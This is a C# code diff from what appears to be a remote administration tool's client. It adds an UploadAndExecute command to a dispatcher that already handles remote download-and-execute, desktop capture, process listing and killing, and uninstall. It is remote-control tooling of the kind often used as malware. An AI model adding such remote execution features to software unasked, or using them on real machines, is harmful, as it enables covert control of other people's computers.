@@ -68,6 +68,7 @@ static class Program
                 typeof(Core.Packets.ServerPackets.Reconnect),
                 typeof(Core.Packets.ServerPackets.Uninstall),
                 typeof(Core.Packets.ServerPackets.DownloadAndExecute),
+                typeof(Core.Packets.ServerPackets.UploadAndExecute),
                 typeof(Core.Packets.ServerPackets.Desktop),
                 typeof(Core.Packets.ServerPackets.GetProcesses),
                 typeof(Core.Packets.ServerPackets.KillProcess),
@@ -169,6 +170,10 @@ static class Program
         else if (type == typeof(Core.Packets.ServerPackets.DownloadAndExecute))
         {
             CommandHandler.HandleDownloadAndExecuteCommand((Core.Packets.ServerPackets.DownloadAndExecute)packet, client);
+        }
+        else if (type == typeof(Core.Packets.ServerPackets.UploadAndExecute))
+        {
+            CommandHandler.HandleUploadAndExecute((Core.Packets.ServerPackets.UploadAndExecute)packet, client);
         }
         else if (type == typeof(Core.Packets.ServerPackets.Disconnect))
         {
